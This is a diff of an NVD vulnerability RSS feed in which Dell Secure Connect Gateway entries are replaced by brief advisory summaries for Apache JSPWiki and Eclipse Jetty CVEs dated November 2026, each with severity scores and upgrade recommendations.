-    <description>Wednesday 25 November 2026 | NVD | CVSS Score v3.1: 5.1 | Dell Secure Connect Gateway (SCG) Virtual Edition, versions prior to 5.36.00.16, contains a Missing Authorization vulnerability. An attacker with local access could potentially exploit this vulnerability, leading to unauthorized actions and information exposure.</description>
+    <title>CVE-2026-78098 - NVD - CVSS: não informado</title>
+    <link>https://nvd.nist.gov/vuln/detail/CVE-2026-78098</link>
+    <guid isPermaLink="false">51d37e4111e8cd8501892671a0a6ca7a</guid>
+    <description>Wednesday 25 November 2026 | NVD | CVSS: não informado | Wiki page level access control list bypass in Apache JSPWIKI versions prior to 3.0.1 on all platforms allows an attacker to bypass page level access controls through a specifically crafted wiki page.
+Users are recommended to upgrade to version 3.0.1 which fixes this issue.</description>
     <category>NVD</category>
     <pubDate>Wed, 25 Nov 2026 00:00:00 +0000</pubDate>
   </item>
   <item>
-    <title>CVE-2026-80273 - NVD - CVSS Score v3.1: 8.4</title>
-    <link>https://nvd.nist.gov/vuln/detail/CVE-2026-80273</link>
-    <guid isPermaLink="false">c88d4e6f9f687a225949333b95620639</guid>
-    <description>Wednesday 25 November 2026 | NVD | CVSS Score v3.1: 8.4 | Dell Secure Connect Gateway (SCG) Virtual Edition, versions prior to 5.36.00.16, contains an Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection') vulnerability. An attacker with local access to the appliance could potentially exploit this vulnerability, leading to arbitrary command execution and privilege escalation, resulting in complete compromise of confidentiality, integrity, and availability of the appliance.</description>
+    <title>CVE-2026-78099 - NVD - CVSS: não informado</title>
+    <link>https://nvd.nist.gov/vuln/detail/CVE-2026-78099</link>
+    <guid isPermaLink="false">2b7efdaa32943d81a0df7fded9ada500</guid>
+    <description>Wednesday 25 November 2026 | NVD | CVSS: não informado | Cross Site Request Forgery in multiple components in Apache JSPWIKI on the specified versions on all platforms allows an attacker to bypass CSRF protections under specific conditions and http methods.
+Users are recommended to upgrade to version 3.0.1, which fixes this issue.</description>
     <category>NVD</category>
     <pubDate>Wed, 25 Nov 2026 00:00:00 +0000</pubDate>
   </item>
   <item>
-    <title>CVE-2026-80283 - NVD - CVSS Score v3.1: 8.4</title>
-    <link>https://nvd.nist.gov/vuln/detail/CVE-2026-80283</link>
-    <guid isPermaLink="false">e8bff4cbf8c51451645ebc941304563c</guid>
-    <description>Wednesday 25 November 2026 | NVD | CVSS Score v3.1: 8.4 | Dell Secure Connect Gateway (SCG) Virtual Edition, versions prior to 5.36.00.16, contains a Missing Authentication for Critical Function vulnerability. An attacker with local access could potentially exploit this vulnerability, leading to unauthorized disclosure of sensitive information, unauthorized modification of system resources, and execution of privileged actions that could lead to compromise of the appliance.</description>
+    <title>CVE-2026-78102 - NVD - CVSS: não informado</title>
+    <link>https://nvd.nist.gov/vuln/detail/CVE-2026-78102</link>
+    <guid isPermaLink="false">8d64be9817d83dd44a85dc84f4aaefe3</guid>
+    <description>Wednesday 25 November 2026 | NVD | CVSS: não informado | Denial of Service in DefaultPluginManager in Apache JSPWIKI versions prior to the fixed version on all platforms allows an attacker to spawn multiple threads until resource exhaustion or to class load any class on the classpath and creating an instance of it.
+Users are recommended to upgrade to version 3.0.1, which fixes this issue.</description>
     <category>NVD</category>
     <pubDate>Wed, 25 Nov 2026 00:00:00 +0000</pubDate>
   </item>
   <item>
-    <title>CVE-2026-80284 - NVD - CVSS Score v3.1: 7.7</title>
-    <link>https://nvd.nist.gov/vuln/detail/CVE-2026-80284</link>
-    <guid isPermaLink="false">952ca93baf8b51d9a1db48eac6878b29</guid>
-    <description>Wednesday 25 November 2026 | NVD | CVSS Score v3.1: 7.7 | Dell Secure Connect Gateway (SCG) Virtual Edition, versions prior to 5.36.00.16, contains an Improper Authentication vulnerability. An attacker with local access could potentially exploit this vulnerability, leading to exposure of sensitive data and unauthorized modification of system operations.</description>
+    <title>CVE-2026-78111 - NVD - CVSS: não informado</title>
+    <link>https://nvd.nist.gov/vuln/detail/CVE-2026-78111</link>
+    <guid isPermaLink="false">ebe71e368fe1829a31291f11de4122df</guid>
+    <description>Wednesday 25 November 2026 | NVD | CVSS: não informado | Token Exposure in AttachmentTab.jsp in Apache JSPWIKI in the effected version on all platforms exposes the Cross Site Request Forgery protected token via the address bar.
+
+
+
+
+Users are recommended to upgrade to version 3.0.1 which fixes this issue.</description>
     <category>NVD</category>
     <pubDate>Wed, 25 Nov 2026 00:00:00 +0000</pubDate>
   </item>
   <item>
-    <title>CVE-2026-80285 - NVD - CVSS Score v3.1: 7.8</title>
-    <link>https://nvd.nist.gov/vuln/detail/CVE-2026-80285</link>
-    <guid isPermaLink="false">b1420e62acd318a21e46be49f5768eb1</guid>
-    <description>Wednesday 25 November 2026 | NVD | CVSS Score v3.1: 7.8 | Dell Secure Connect Gateway (SCG) Virtual Edition, versions prior to 5.36.00.16, contains an Execution with Unnecessary Privileges vulnerability. A low privileged attacker with local access could potentially exploit this vulnerability, leading to elevation of privileges.</description>
+    <title>CVE-2026-78114 - NVD - CVSS Score v4.0: 10.0</title>
+    <link>https://nvd.nist.gov/vuln/detail/CVE-2026-78114</link>
+    <guid isPermaLink="false">941704897851905cbfc7eb625c1cc81f</guid>
+    <description>Wednesday 25 November 2026 | NVD | CVSS Score v4.0: 10.0 | Session Fixation in the login flow of Apache JSPWiki versions 2.10 through 3.0.0 on all platforms. The session identifier was not replaced when a user authenticated, so an attacker who could set a known session identifier in the browser of a victim could use the same identifier after the victim logged in.
+
+
+
+Users are recommended to upgrade to version 3.0.1 (3.x) or 2.12.6 (2.x), which fix this issue.</description>
+    <category>NVD</category>
+    <pubDate>Wed, 25 Nov 2026 00:00:00 +0000</pubDate>
+  </item>
+  <item>
+    <title>CVE-2026-82359 - NVD - CVSS: não informado</title>
+    <link>https://nvd.nist.gov/vuln/detail/CVE-2026-82359</link>
+    <guid isPermaLink="false">11617dbe73b8245dc284e5189b300372</guid>
+    <description>Wednesday 25 November 2026 | NVD | CVSS: não informado | Cross Site Request Forgery protections are improperly configured in jspwiki.war in Apache JSPWIKI 3.0.0 on all platforms allows attacker to bypass protections for CSRF. A work around exists for existing deployments.
+Users are recommended to upgrade to version 3.0.1 which fixes this issue.</description>
+    <category>NVD</category>
+    <pubDate>Wed, 25 Nov 2026 00:00:00 +0000</pubDate>
+  </item>
+  <item>
+    <title>CVE-2026-95533 - NVD - CVSS Score v4.0: 8.2</title>
+    <link>https://nvd.nist.gov/vuln/detail/CVE-2026-95533</link>
+    <guid isPermaLink="false">f974f390cdcb6a7d55a1ea081c89e0ef</guid>
+    <description>Wednesday 25 November 2026 | NVD | CVSS Score v4.0: 8.2 | In Eclipse Jetty, the JSON parsing utilities provided by artifact `jetty-util-ajax` are vulnerable to `StackOverflowError` for inputs that have a large recursive structure.</description>
     <category>NVD</category>
     <pubDate>Wed, 25 Nov 2026 00:00:00 +0000</pubDate>
   </item>
